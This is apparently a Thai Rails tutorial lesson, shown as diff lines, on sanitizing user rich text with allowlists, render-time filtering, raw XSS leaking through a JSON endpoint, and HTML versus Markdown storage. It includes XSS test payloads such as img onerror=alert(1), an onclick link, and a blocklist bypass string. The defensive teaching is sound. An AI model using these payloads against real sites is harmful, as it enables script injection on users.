+    ตัวหนา ลิงก์ และ <code>&lt;img src="x" onerror="alert(1)"&gt;</code> — ชิ้นไหนรอด ชิ้นไหนหาย?</p>
+  <button class="reveal">เฉลย</button>
+  <div class="answer">
+<pre><code>$ curl -s localhost:3000/posts/31 | grep "leading-relaxed"
+&lt;/turbo-frame&gt;      &lt;p class="leading-relaxed whitespace-pre-line"&gt;น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href="/posts"&gt;หน้ารวม&lt;/a&gt;&lt;img src="x"&gt;&lt;/p&gt;</code></pre>
+    <ul>
+      <li><code>&lt;strong&gt;</code> · <code>&lt;a href="/posts"&gt;</code> — <strong>แท็กจริง</strong> แล้ว (ไม่มี <code>&amp;lt;</code>) · บนจอ "เข้มข้น" เป็นตัวหนา</li>
+      <li><code>&lt;img src="x"&gt;</code> — <strong>รูปยังอยู่ แต่ <code>onerror</code> หายไป</strong> · บนจอเห็นไอคอนรูปแตกเล็ก ๆ · Chrome ยืนยันว่า alert ไม่ทำงาน</li>
+    </ul>
+    <p>ปลอดภัยแล้ว แต่รายการเริ่มต้น<strong>กว้างกว่าที่เราต้องการ</strong> — ใน Rails 8.1.4 มี 43 แท็ก (รวม <code>img</code> · <code>h1</code>–<code>h6</code> · <code>div</code> …) · บทความรีวิวร้านอาหารไม่ต้องการรูปที่ผู้ใช้แปะ URL มาเอง</p>
+  </div>
+</div>
+
+<p>บีบรายการให้เหลือแค่ที่ใช้จริง (แบบสไลด์หน้า 6):</p>
+
+<pre><code>      &lt;p class="leading-relaxed whitespace-pre-line"&gt;&lt;%= <span class="f">sanitize</span> post.description, <span class="n">tags:</span> <span class="s">%w[p a strong em]</span>, <span class="n">attributes:</span> <span class="s">%w[href]</span> %&gt;&lt;/p&gt;</code></pre>
+
+<ul>
+  <li><code>tags:</code> — <strong>แท็กที่อนุญาต</strong> แทนรายการเริ่มต้นทั้งหมด · <code>%w[p a strong em]</code> = วิธีเขียนรายการคำสั้น ๆ ของ Ruby เท่ากับ <code>["p", "a", "strong", "em"]</code></li>
+  <li><code>attributes:</code> — <strong>ช่องในแท็กที่อนุญาต</strong> · ให้แค่ <code>href</code> (ที่อยู่ของลิงก์) · อย่างอื่นเช่น <code>class</code> <code>style</code> <code>on…</code> ถูกตัดหมด</li>
+</ul>
+
+<p>บันทึก แล้ว curl อีกรอบ — ผลจริง:</p>
+
+<pre><code>$ curl -s localhost:3000/posts/31 | grep "leading-relaxed"
+&lt;/turbo-frame&gt;      &lt;p class="leading-relaxed whitespace-pre-line"&gt;น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href="/posts"&gt;หน้ารวม&lt;/a&gt;&lt;/p&gt;</code></pre>
+
+<p>
+  <code>&lt;img&gt;</code> หายไปทั้งแท็ก เพราะไม่อยู่ในรายการ 4 คำของเรา · ตัวหนากับลิงก์ยังอยู่ ·
+  <strong>นี่คือ rich text ที่ปลอดภัย</strong>: ผู้ใช้ได้รูปแบบที่ต้องการ และเราคุมได้ว่ารูปแบบไหนบ้าง
+</p>
+
+<div class="warn">
+  <p>⚠️ <strong>อย่าเติมแท็กลงรายการเพราะ "ผู้ใช้ขอ"</strong> โดยไม่คิด · บท 125 ลองแล้วว่าใส่ <code>script</code> ลงรายการเอง sanitize ก็ปล่อย script ผ่านทั้งก้อน — มันเชื่อรายการของเราเสมอ</p>
+</div>
+
+<h2 id="sn-sec-6">sanitize ทำงานตอนโชว์ ไม่ใช่ตอนบันทึก</h2>
+
+<p>
+  หน้าเว็บสะอาดแล้ว · แต่<strong>ในฐานข้อมูลล่ะ?</strong> ถามใน console — ผลจริง:
+</p>
+
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; <span class="n">Post</span>.<span class="f">find</span>(<span class="n">31</span>).description
+  Post Load (0.4ms)  SELECT "posts".* FROM "posts" WHERE "posts"."id" = 31 LIMIT 1 /*application='WongnokBlogAllInOne'*/
+=&gt; "น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href=\"/posts\"&gt;หน้ารวม&lt;/a&gt;&lt;img src=\"x\" onerror=\"alert(1)\"&gt;"</code></pre>
+
+<p>
+  <strong><code>onerror</code> ยังอยู่ครบ</strong> · <code>sanitize</code> ไม่ได้แตะฐานข้อมูลเลย มันกรอง<strong>ระหว่างทางออกไปหน้าเว็บ</strong>ทุกครั้งที่มีคนเปิดหน้า (สไลด์หน้า 6):
+</p>
+
+<div class="diagram">ผู้ใช้พิมพ์  ──►  บันทึกลง DB ดิบ ๆ  ──►  sanitize ตอนอ่าน (ใน view)  ──►  ส่งออกไปหน้าเว็บ ✅
+                       │
+                       └──►  ทางอื่นที่ไม่ผ่าน view (JSON · อีเมล · PDF)  ──►  ของสกปรกหลุดออกไป ❌</div>
+
+<p>
+  ทางอื่นที่ไม่ผ่าน view มีอยู่แล้วในแอปเรา — scaffold สร้างหน้า JSON ไว้ให้ตั้งแต่สร้างโปรเจกต์ (<code>app/views/posts/show.json.jbuilder</code> = แม่พิมพ์ของหน้า JSON บท 118 · เปิดด้วยการต่อ <code>.json</code> ท้าย URL) สำหรับแอปมือถือหรือโปรแกรมอื่นมาดึงข้อมูล · ผลจริง:
+</p>
+
+<pre><code>$ curl -s localhost:3000/posts/31.json
+{"id":31,"title":"ข้าวซอยร้านนี้ \u003cstrong\u003eอร่อย\u003c/strong\u003e","description":"น้ำแกง\u003cstrong\u003eเข้มข้น\u003c/strong\u003e ดูร้านอื่นที่\u003ca href=\"/posts\"\u003eหน้ารวม\u003c/a\u003e\u003cimg src=\"x\" onerror=\"alert(1)\"\u003e","category_id":1,"created_at":"2026-11-10T09:47:41.008+07:00","updated_at":"2026-11-10T09:47:41.008+07:00","url":"http://localhost:3000/posts/31.json"}</code></pre>
+
+<ul>
+  <li><code>\u003c</code> · <code>\u003e</code> — รหัสของ <code>&lt;</code> <code>&gt;</code> ในรูปแบบ JSON · <strong>ไม่ใช่การกรอง</strong> โปรแกรมไหนอ่าน JSON ก็ได้ <code>&lt;</code> กลับมาเหมือนเดิม</li>
+  <li><code>onerror=\"alert(1)\"</code> — <strong>ส่งออกไปครบ</strong> · ถ้าแอปมือถือเอา description ไปวางเป็น HTML ผู้ใช้แอปโดน XSS</li>
+</ul>
+
+<p>ลองให้ Ruby ทำตัวเป็นแอปมือถือ: อ่าน JSON แล้วพิมพ์ description ออกมา (<code>ruby -rjson -e '…'</code> = รันโค้ด Ruby บรรทัดเดียวที่โหลดตัวอ่าน JSON ไว้) — ผลจริง:</p>
+
+<pre><code>$ curl -s localhost:3000/posts/31.json | ruby -rjson -e 'puts JSON.parse(STDIN.read)["description"]'
+น้ำแกง&lt;strong&gt;เข้มข้น&lt;/strong&gt; ดูร้านอื่นที่&lt;a href="/posts"&gt;หน้ารวม&lt;/a&gt;&lt;img src="x" onerror="alert(1)"&gt;</code></pre>
+
+<ul>
+  <li><code>STDIN.read</code> — อ่านทุกอย่างที่ <code>|</code> ส่งมา (JSON ทั้งก้อน) · <code>JSON.parse(…)</code> — แปลงข้อความ JSON เป็น Hash ของ Ruby</li>
+  <li><code>["description"]</code> — หยิบช่อง description ออกมา · <code>puts</code> — พิมพ์ออกจอ · ผล: <code>\u003c</code> กลับมาเป็น <code>&lt;</code> และ <code>onerror</code> อยู่ครบ</li>
+</ul>
+
+<p>
+  <strong>ของสกปรกอยู่ใน DB จริง ๆ</strong> · จุดที่ปลอดภัยคือ "ตอน render ผ่าน Rails view" เท่านั้น (สไลด์หน้า 6) · ส่งออกทางอื่นเมื่อไหร่ ต้อง sanitize ที่ทางนั้นด้วย
+</p>
+
+<p>
+  <strong>แล้วทำไมไม่กรองตอนบันทึกให้จบ ๆ ไป?</strong> เพราะ<strong>กฎว่าอะไรปลอดภัยเปลี่ยนได้</strong> — มีวิธีหลบใหม่ ๆ ถูกค้นพบทุกปี ·
+  กรองตอนบันทึก = ของเก่าที่บันทึกไปแล้วตามกฎเก่า<strong>แก้ย้อนหลังไม่ได้</strong> · กรองตอนโชว์ = แก้กฎ (หรือ Rails ออก patch = รุ่นแก้ช่องโหว่) แล้ว<strong>ของเก่าทุกชิ้นปลอดภัยขึ้นทันที</strong>โดยไม่ต้องรัน migration ·
+  คุณเพิ่งเห็นกับตาเมื่อกี้: เปลี่ยน view จากรายการเริ่มต้นเป็น 4 แท็ก → <code>&lt;img&gt;</code> ของบทความ 31 หายจากหน้าเว็บทันที ทั้งที่ในฐานข้อมูลไม่ถูกแก้สักตัวอักษร
+</p>
+
+<div class="analogy">
+  <span class="label">🍽 เทียบให้เห็นภาพ — ตรวจตอนจัดจาน ไม่ใช่ตอนรับออเดอร์</span>
+  <p>
+    ร้านเก็บข้อความหน้าเค้ก<strong>ตามที่ลูกค้าส่งมาทุกตัวอักษร</strong>ไว้ในตู้แฟ้ม · คนจัดจาน (view) ถือรายการตัวตกแต่งที่อนุญาต และ<strong>ตรวจทุกครั้งที่จัดจาน</strong> ·
+    วันไหนร้านออกกฎใหม่ "เลิกใช้สีผสมอาหารตัวนี้" ออเดอร์เก่าที่เก็บไว้ก็ได้จานตามกฎใหม่ทันที เพราะยังไม่เคยมีใครตัดสินแทนไว้ล่วงหน้า
+  </p>
+  <p>
+    <strong>ที่ไม่เหมือนกัน:</strong> ในร้านจริงของที่ถูกแกะทิ้งตอนจัดจานก็หายไปเลย · ในระบบ<strong>ของในตู้ไม่ถูกแตะ</strong> ·
+    ถ้าวันไหนมีคน<strong>ตักจากตู้ไปส่งเองโดยไม่ผ่านคนจัดจาน</strong> (หน้า JSON · อีเมล · <code>raw</code>) ของต้องห้ามก็ยังอยู่ครบ
+  </p>
+</div>
+
+<div class="jargon">
+  <span class="label">🗣 ศัพท์ที่เพิ่งเรียนไป</span>
+  <dl>
+    <dt>sanitize on output (render time)</dt>
+    <dd>เก็บของดิบ กรองตอนแสดงผลทุกครั้ง — แนวทางของ Rails · ข้อดี: กฎใหม่ใช้กับของเก่าทันที · ข้อเสีย: ทุกทางที่ส่งข้อมูลออกต้องกรองเอง ·
+        <strong>ถาม senior ได้ว่า "ข้อมูลช่องนี้ถูกส่งออกทางไหนบ้างนอกจากหน้าเว็บ แล้วแต่ละทางกรองไหม"</strong></dd>
+    <dt>API response · JSON</dt>
+    <dd>ข้อมูลที่ส่งให้โปรแกรมอื่น (แอปมือถือ · frontend อีกตัว) แทนหน้าเว็บ · ไม่ผ่าน view → ไม่ผ่าน sanitize ·
+        <strong>พิมพ์บอก AI ได้ว่า "description is stored as raw user HTML; the JSON API must sanitize it or send plain text"</strong></dd>
+  </dl>
+</div>
+
+<h2 id="sn-sec-7">เก็บเป็น HTML หรือ Markdown — และปัญหาตอนค้นหา</h2>
+
+<p>
+  ต้องตัดสินใจตั้งแต่วันแรก เพราะย้ายทีหลังเจ็บ (สไลด์หน้า 7) · <strong>Markdown</strong> คือวิธีเขียนรูปแบบด้วยสัญลักษณ์ธรรมดา เช่น <code>**อร่อย**</code> = ตัวหนา · <code>[หน้ารวม](/posts)</code> = ลิงก์ —
+  ไฟล์ <code>prompts/*.md</code> ของเราก็เป็น Markdown
+</p>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th></th><th>เก็บ HTML (Action Text ทำแบบนี้)</th><th>เก็บ Markdown</th></tr></thead>
+  <tbody>
+    <tr><td>ตอนโชว์</td><td>โชว์ได้เลย แต่ต้อง sanitize ทุกครั้ง</td><td>ต้องแปลงเป็น HTML ทุกครั้ง (หรือ cache ไว้ — บล็อก F)</td></tr>
+    <tr><td>ช่องพิมพ์</td><td>editor แบบเห็นผลทันทีทำง่าย</td><td>editor แบบเห็นผลทันทีทำยากกว่า</td></tr>
+    <tr><td>เอาไปใช้ที่อื่น</td><td>ยาก — แอปมือถือต้องจัดการ HTML</td><td>ง่าย — มือถือ · API · ไฟล์ อ่านรู้เรื่อง</td></tr>
+    <tr><td>ความปลอดภัย</td><td>ต้อง sanitize</td><td><strong>ก็ยังต้อง sanitize ผลที่แปลงแล้ว</strong> (ดูท้ายตาราง)</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  สไลด์บอกว่า Markdown "ไม่มีแท็กให้กลัว" — ระวัง · ผมลองตัวแปลง Markdown ที่ติดมากับ Ruby (RDoc) กับข้อความ <code>ร้านนี้ **อร่อย**</code> ตามด้วยบรรทัด <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ·
+  ผลคือ <code>&lt;p&gt;ร้านนี้ &lt;strong&gt;อร่อย&lt;/strong&gt;&lt;/p&gt;</code> ตามด้วย <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> <strong>ตัวจริงผ่านออกมา</strong> · อย่างน้อยตัวแปลงที่ลองนี้ยอมให้แทรก HTML ดิบ — เลือกตัวแปลงตัวไหนก็ต้องเช็คก่อนเสมอ
+</p>
+
+<p>
+  คำแนะนำของสไลด์: เนื้อหาถูกอ่านแค่บนเว็บเรา → เก็บ HTML (Action Text) ไปเลย เร็ว ไม่ต้องคิดมาก · มีแอปมือถือหรือส่งออกไปที่อื่นด้วย → Markdown คุ้มกว่า ·
+  (โลก Next.js มีทางที่สาม: <strong>MDX</strong> = Markdown ที่แปลงเป็นหน้าเว็บตอน build ทีเดียว เหมาะกับเนื้อหาที่ทีมเขียนเองและไม่ค่อยเปลี่ยน)
+</p>
+
+<div class="analogy">
+  <span class="label">📋 เทียบให้เห็นภาพ — เก็บเค้กที่แต่งเสร็จ หรือเก็บใบสั่งแต่งเค้ก</span>
+  <p>
+    เก็บ HTML = เก็บ<strong>เค้กที่แต่งเสร็จแล้ว</strong>ไว้ทั้งก้อน · เสิร์ฟได้ทันที แต่จะส่งให้สาขาอื่นที่ใช้จานคนละแบบ ต้องรื้อแต่งใหม่ ·
+    เก็บ Markdown = เก็บ<strong>ใบสั่งแต่งเค้ก</strong>ที่เขียนด้วยสัญลักษณ์ง่าย ๆ · ทุกครั้งที่เสิร์ฟต้องแต่งใหม่ แต่ส่งไปสาขาไหนก็แต่งตามใบได้
+  </p>
+  <p>
+    <strong>ที่ไม่เหมือนกัน:</strong> ใบสั่งในร้านจริงมีแค่คำสั่งแต่ง · ใบสั่ง Markdown <strong>แอบแนบของจริง (HTML ดิบ) มาด้วยได้</strong> ตามที่ลองเมื่อกี้ — ต้องมีคนตรวจตอนจัดจานเหมือนเดิม
+  </p>
+</div>
+
+<p>
+  <strong>ปัญหาที่คนลืมคิด: การค้นหา</strong> · ถ้าเก็บ HTML แล้วค้นด้วยคำ คำว่า <code>strong</code> · <code>div</code> ที่เป็นชื่อแท็กจะปนมาด้วย · ลองค้นคำว่า strong (ผลจริง):
+</p>
+
+<pre><code>wongnok-blog-all-in-one(dev):002&gt; <span class="n">Post</span>.<span class="f">where</span>(<span class="s">"description ILIKE ?"</span>, <span class="s">"%strong%"</span>).<span class="f">pluck</span>(<span class="n">:id</span>)
+  Post Pluck (2.0ms)  SELECT "posts"."id" FROM "posts" WHERE (description ILIKE '%strong%') /*application='WongnokBlogAllInOne'*/
+=&gt; [31]
+wongnok-blog-all-in-one(dev):003&gt; helper.<span class="f">strip_tags</span>(<span class="n">Post</span>.<span class="f">find</span>(<span class="n">31</span>).description)
+  Post Load (1.2ms)  SELECT "posts".* FROM "posts" WHERE "posts"."id" = 31 LIMIT 1 /*application='WongnokBlogAllInOne'*/
+=&gt; "น้ำแกงเข้มข้น ดูร้านอื่นที่หน้ารวม"</code></pre>
+
+<ul>
+  <li><code>ILIKE ?</code> + <code>"%strong%"</code> — คำสั่ง SQL "ค้นข้อความที่มีคำนี้อยู่ตรงไหนก็ได้ ไม่สนตัวพิมพ์เล็กใหญ่" (<code>%</code> = อะไรก็ได้กี่ตัวก็ได้) · <code>pluck(:id)</code> = เอาแค่ id (บท 113)</li>
+  <li><code>[31]</code> — <strong>เจอบทความ 31</strong> ทั้งที่บนจอไม่มีคำว่า strong สักตัว · มันไปเจอในชื่อแท็ก</li>
+  <li><code>strip_tags</code> — helper ที่<strong>ถอดแท็กทิ้งทั้งหมด</strong> เหลือแค่ตัวหนังสือ (plain text) · ของแบบนี้แหละที่ควรค้น</li>
+</ul>
+
+<p>
+  ทางแก้ของสไลด์: <strong>เก็บอีกช่องเป็นตัวหนังสือล้วน (plain_text) แล้วค้นจากช่องนั้น</strong> · บท 137 ทำจริง
+</p>
+
+<div class="jargon">
+  <span class="label">🗣 ศัพท์ที่เพิ่งเรียนไป</span>
+  <dl>
+    <dt>Markdown · MDX</dt>
+    <dd>Markdown = เขียนรูปแบบด้วยสัญลักษณ์ (<code>**หนา**</code> · <code># หัวข้อ</code>) · MDX = Markdown ที่ใส่ component ของ React ได้ แปลงตอน build ·
+        <strong>ถาม senior ได้ว่า "เนื้อหานี้จะถูกใช้นอกเว็บไหม ถ้าใช่ เก็บ Markdown ดีกว่าหรือเปล่า"</strong></dd>
+    <dt>plain text column (สำหรับค้นหา)</dt>
+    <dd>ช่องที่เก็บเนื้อหาแบบถอดแท็กแล้ว ไว้ค้นหา/ตัดเป็นคำโปรย โดยไม่มีชื่อแท็กปน ·
+        <strong>พิมพ์บอก AI ได้ว่า "store a plain-text copy of the rich text body and search that column, not the HTML"</strong></dd>
+  </dl>
+</div>
+
+<h2 id="sn-sec-8">ต่อไป: ของสำเร็จรูปที่มากับ Rails</h2>
+
+<p>
+  ที่ทำในบทนี้เป็นการ<strong>ประกอบเองด้วยมือ</strong>เพื่อให้เห็นกลไก · ของจริงยังขาด: <strong>ช่องพิมพ์แบบมีปุ่ม B</strong> (ตอนนี้ต้องพิมพ์แท็กเอง) · ช่อง plain text ไว้ค้นหา · รายการแท็กกลางที่ใช้ทั้งแอป ·
+  Rails มีของสำเร็จรูปชื่อ <strong>Action Text</strong> ที่ทำทั้งหมดนี้ และ<strong>ตรวจตอนโชว์ให้เองแบบที่เพิ่งเรียน</strong> — บท 137 ติดตั้งจริง
+</p>
+
+<div class="task">
+  <h3 id="sn-sub-1">🎯 ภารกิจ — ทายก่อนว่ากฎ 4 แท็กจะถอดอะไรทิ้ง (~8 นาที)</h3>
+  <p>ทำต่อจากที่เดิม: <code>_post.html.erb</code> ยังเป็น <code>sanitize … tags: %w[p a strong em], attributes: %w[href]</code> และบทความ 31 ยังอยู่</p>
+  <ol>
+    <li>ใน console เปลี่ยนคำอธิบายของบทความล่าสุดเป็นข้อความใหม่ที่มี<strong>หัวข้อ</strong> <code>&lt;h2&gt;</code> · ตัวเอียง <code>&lt;em&gt;</code> · และลิงก์ที่แอบมี <code>onclick</code>:
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; post = <span class="n">Post</span>.<span class="f">last</span>
+wongnok-blog-all-in-one(dev):002&gt; post.<span class="f">update!</span>(description: <span class="s">'&lt;h2&gt;เมนูแนะนำ&lt;/h2&gt;ข้าวซอย&lt;em&gt;ไก่&lt;/em&gt; &lt;a href="/posts" onclick="alert(1)"&gt;ดูร้านอื่น&lt;/a&gt;'</span>)</code></pre>
+      (<code>Post.last</code> = บทความที่ id มากที่สุด = ชิ้นที่เราสร้าง · <code>update!</code> = แก้แล้วบันทึก บท 110)</li>
+    <li><strong>ก่อนรัน curl</strong> เขียนลงกระดาษ: แท็กไหนรอด · แท็กไหนหายแต่ตัวหนังสือยังอยู่ · ช่องไหนในแท็กถูกตัด</li>
+    <li>รัน <code>curl -s localhost:3000/posts/31 | grep "leading-relaxed"</code> แล้วเทียบกับที่ทาย</li>
+    <li>เปิดหน้ารวม <code>http://localhost:3000/posts</code> ดูการ์ดของบทความนี้ด้วย</li>
+  </ol>
+  <p class="ask">ก่อนกดเฉลย: <code>&lt;h2&gt;</code> · <code>&lt;em&gt;</code> · <code>onclick</code> แต่ละตัวเป็นยังไง และการ์ดในหน้ารวมเห็นอะไร?</p>
+  <button class="reveal">เฉลย</button>
+  <div class="answer">
+    <p>ผลจริง:</p>
+<pre><code>$ curl -s localhost:3000/posts/31 | grep "leading-relaxed"
+&lt;/turbo-frame&gt;      &lt;p class="leading-relaxed whitespace-pre-line"&gt;เมนูแนะนำข้าวซอย&lt;em&gt;ไก่&lt;/em&gt; &lt;a href="/posts"&gt;ดูร้านอื่น&lt;/a&gt;&lt;/p&gt;</code></pre>
+    <ul>
+      <li><code>&lt;h2&gt;</code> <strong>ไม่อยู่ในรายการ</strong> → แท็กหาย แต่คำว่า "เมนูแนะนำ" ยังอยู่ ไปติดกับ "ข้าวซอย" (ไม่มีหัวข้อใหญ่แล้ว)</li>
+      <li><code>&lt;em&gt;</code> อยู่ในรายการ → รอด · บนจอ "ไก่" เป็นตัวเอียง</li>
+      <li><code>&lt;a&gt;</code> รอดพร้อม <code>href</code> · <code>onclick</code> <strong>ถูกตัด</strong> เพราะ <code>attributes:</code> ของเรามีแค่ <code>href</code></li>
+    </ul>
+    <p>การ์ดในหน้ารวมใช้อีกบรรทัด (<code>truncate(post.description, …)</code> ตัดให้สั้น) ซึ่งเรา<strong>ไม่ได้แก้</strong> — ผลจริง:</p>
+<pre><code>$ curl -s localhost:3000/posts | grep "เมนูแนะนำ"
+      &lt;p class="text-base-content/80"&gt;&amp;lt;h2&amp;gt;เมนูแนะนำ&amp;lt;/h2&amp;gt;ข้าวซอย&amp;lt;em&amp;gt;ไก่&amp;lt;/em&amp;gt; &amp;lt;a href=&amp;quot;/posts&amp;quot;...&lt;/p&gt;</code></pre>
+    <p><strong>ถ้าเจออาการนี้ แปลว่า…</strong></p>
+    <ul>
+      <li><strong>การ์ดหน้ารวมเห็นแท็กเป็นตัวหนังสือ <code>&lt;h2&gt;เมนูแนะนำ…</code></strong> — ปกติ · บรรทัดนั้นยัง escape ทั้งหมด (ปลอดภัย แต่น่าเกลียด) · บท 137 แก้ด้วย plain text</li>
+      <li><strong>ลิงก์ "ดูร้านอื่น" ไม่ขีดเส้นใต้ ไม่เป็นสีฟ้า</strong> — Tailwind ล้างหน้าตาเริ่มต้นของเบราว์เซอร์ทิ้งทั้งเว็บ (preflight · <a href="../../fe-nextjs/lessons/0072-tailwindcss.html">บท 72</a>) · แท็ก <code>&lt;a href&gt;</code> ยังอยู่และกดได้</li>
+      <li><strong>เห็น <code>&amp;lt;h2&amp;gt;</code> ในหน้าบทความด้วย</strong> — ไฟล์ <code>_post.html.erb</code> ถูกคืนไปแล้ว หรือไปแก้บรรทัด <code>truncate</code> แทน · ต้องแก้บรรทัดใน <code>&lt;% if full %&gt;</code></li>
+      <li><strong>curl ได้ผลว่าง ไม่มีบรรทัดไหนขึ้น</strong> — id ของคุณไม่ใช่ 31 · ดูเลขด้วย <code>post.id</code> ใน console แล้วเปลี่ยน URL</li>
+    </ul>
+  </div>
+</div>
+
+<h2 id="sn-sec-9">ทดสอบความเข้าใจ</h2>
+
+<div class="quiz" data-answer="2">
+  <p class="q">ทีม A กรอง rich text ด้วย <strong>allowlist</strong> แต่ลืมใส่ <code>em</code> · ทีม B ใช้ <strong>blocklist</strong> (ห้าม <code>script</code> กับ <code>iframe</code>) แต่ลืม <code>onerror</code> · ข้อไหนถูก?</p>
+  <div class="opts">
+    <button class="opt">ทั้งสองทีมเสี่ยงพอ ๆ กัน เพราะต่างคนต่างลืมของไปหนึ่งอย่างเท่ากัน</button>
+    <button class="opt">ทีม A อันตรายกว่า เพราะตัวเอียงที่ผู้ใช้พิมพ์จะหลุดไปเป็นแท็กดิบ</button>
+    <button class="opt">ทีม A แค่ตัวเอียงหาย เห็นตอนทดสอบ · ทีม B มีช่องให้รันโค้ดโดยไม่รู้ตัว</button>
+    <button class="opt">ทีม B ปลอดภัยกว่า เพราะ blocklist ตัดของอันตรายที่รู้จักออกครบแล้ว</button>
+  </div>
+  <div class="explain">
+    <p><strong>ตัวเลือกที่ 3 ถูก</strong> — allowlist ลืมของ = ของนั้นถูกถอดทิ้ง (แบบที่ <code>&lt;h2&gt;</code> หายในภารกิจ) feature ขาด เห็นเอง · blocklist ลืมของ = ของนั้นผ่าน (แบบที่ <code>&lt;img onerror&gt;</code> ผ่าน <code>gsub</code> ไปทั้งก้อน) คนร้ายเห็นก่อน</p>
+    <p>ตัวเลือกที่ 1 — ลืมเท่ากันแต่<strong>ผลไม่เท่ากัน</strong> คือหัวใจของหัวข้อนี้ ·
+       ตัวเลือกที่ 2 — แท็กนอกรายการถูก<strong>ถอดทิ้ง</strong> ไม่ได้หลุดออกไป เหลือแค่ตัวหนังสือ ·
+       ตัวเลือกที่ 4 — "ที่รู้จัก" คือปัญหา · ลองแล้วว่าแค่ <code>&lt;sc&lt;script&gt;ript&gt;</code> ก็หลบตัวกรองแบบลบคำได้</p>
+    <p><strong>จุดที่ต้องจำ:</strong> allowlist ผิด = feature ขาด (เราเห็น) · blocklist ผิด = ระบบถูกเจาะ (เราไม่เห็น) → เลือก allowlist เสมอ</p>
+  </div>
+</div>
+
+<div class="quiz" data-answer="0">
+  <p class="q">มีบทความเก่า 500 ชิ้นบันทึกไว้แล้ว บางชิ้นมี <code>&lt;img src="x" onerror="…"&gt;</code> · วันนี้เราเพิ่ม <code>sanitize</code> ใน view · เกิดอะไรกับบทความเก่า?</p>
+  <div class="opts">
+    <button class="opt">หน้าเว็บของชิ้นเก่าปลอดภัยทันที แต่ในฐานข้อมูลยังเก็บของเดิมไว้ครบ</button>
+    <button class="opt">ต้องรัน migration ล้างข้อมูลเก่าก่อน ไม่งั้นหน้าเว็บของชิ้นเก่ายังโดน</button>
+    <button class="opt">ชิ้นเก่าถูกแก้ในฐานข้อมูลให้สะอาดเองตอนมีคนเปิดหน้านั้นครั้งแรก</button>
+    <button class="opt">ปลอดภัยเฉพาะชิ้นที่สร้างหลังวันนี้ ชิ้นเก่ายังเหมือนเดิมทุกอย่าง</button>
+  </div>
+  <div class="explain">
+    <p><strong>ตัวเลือกที่ 1 ถูก</strong> — sanitize กรองระหว่างทางออกไปหน้าเว็บทุกครั้ง · เราเห็นแล้วว่าหน้าเว็บไม่มี <code>onerror</code> แต่ <code>Post.find(31).description</code> ยังมีครบ</p>
+    <p>ตัวเลือกที่ 2 — ไม่ต้อง migrate นี่คือข้อดีของการตรวจตอนโชว์ ·
+       ตัวเลือกที่ 3 — sanitize ไม่เคยเขียนกลับลงฐานข้อมูล ·
+       ตัวเลือกที่ 4 — คือผลของการกรอง<strong>ตอนบันทึก</strong> ซึ่ง Rails ไม่ได้ทำ</p>
+    <p><strong>จุดที่ต้องจำ:</strong> ตรวจตอนโชว์ = แก้กฎแล้วของเก่าปลอดภัยทันที · แต่ของสกปรกยังอยู่ใน DB</p>
+  </div>
+</div>
+
+<div class="quiz" data-answer="3">
+  <p class="q">ทีมมือถือดึง <code>/posts/31.json</code> แล้วเอา description ไปวางเป็น HTML บนจอ · ผู้ใช้แอปโดน alert ทั้งที่หน้าเว็บของเรา sanitize แล้ว · เพราะอะไร?</p>
+  <div class="opts">
+    <button class="opt">เพราะ JSON ของ Rails ไม่แปลง <code>&lt;</code> เลย ส่งแท็กออกไปตรง ๆ ทุกตัว</button>
+    <button class="opt">เพราะ sanitize ใน view เขียน HTML ดิบกลับลงฐานข้อมูลหลังโชว์เสร็จ</button>
+    <button class="opt">เพราะแอปมือถือส่ง cookie ต่างจากเบราว์เซอร์ จึงได้ข้อมูลอีกชุด</button>
+    <button class="opt">เพราะ sanitize อยู่ใน view เท่านั้น หน้า JSON ส่งของดิบจากฐานข้อมูล</button>
+  </div>
+  <div class="explain">
+    <p><strong>ตัวเลือกที่ 4 ถูก</strong> — ผลจริงจาก curl: JSON มี <code>onerror=\"alert(1)\"</code> ครบ · <code>show.json.jbuilder</code> ไม่ผ่าน <code>_post.html.erb</code> ที่เราใส่ sanitize</p>
+    <p>ตัวเลือกที่ 1 — JSON แปลง <code>&lt;</code> เป็น <code>\u003c</code> จริง แต่นั่นเป็นแค่วิธีเขียน อ่านกลับมาก็ได้ <code>&lt;</code> เหมือนเดิม (ลองด้วย <code>JSON.parse</code> แล้ว) · ปัญหาไม่ได้อยู่ที่การแปลงตัวอักษร ·
+       ตัวเลือกที่ 2 — sanitize ไม่เคยเขียนลง DB · ของดิบอยู่ในนั้นมาตั้งแต่บันทึก ·
+       ตัวเลือกที่ 3 — cookie ไม่เกี่ยว ทั้งสองทางอ่านแถวเดียวกันในฐานข้อมูล</p>
+    <p><strong>จุดที่ต้องจำ:</strong> จุดที่ปลอดภัยคือ "render ผ่าน Rails view" เท่านั้น · ทุกทางส่งออกอื่นต้องกรองเอง</p>
+  </div>
+</div>
+
+<div class="quiz" data-answer="1">
+  <p class="q">ช่องค้นหาของเว็บใช้ <code>description ILIKE '%strong%'</code> แล้วเจอบทความที่บนจอไม่มีคำนี้เลย · แก้แบบไหนตรงจุดที่สุด?</p>
+  <div class="opts">
+    <button class="opt">เปลี่ยนไปเก็บ Markdown แทน เพราะ Markdown ไม่มีสัญลักษณ์อะไรปนในข้อความ</button>
+    <button class="opt">เก็บข้อความแบบถอดแท็กแล้วไว้อีกช่อง แล้วให้ช่องค้นหาค้นจากช่องนั้น</button>
+    <button class="opt">ห้ามผู้ใช้พิมพ์คำว่า strong ลงในบทความ แล้วค้นด้วยคำสั่งเดิมต่อไป</button>
+    <button class="opt">ใส่ sanitize ไว้ในคำสั่งค้นหา ให้ฐานข้อมูลถอดแท็กเองระหว่างค้น</button>
+  </div>
+  <div class="explain">
+    <p><strong>ตัวเลือกที่ 2 ถูก</strong> — คำว่า strong มาจาก<strong>ชื่อแท็ก</strong> · <code>strip_tags</code> ให้ <code>"น้ำแกงเข้มข้น ดูร้านอื่นที่หน้ารวม"</code> ที่ไม่มีแท็กปน · เก็บแบบนี้ไว้อีกช่องแล้วค้นจากช่องนั้น (บท 137)</p>
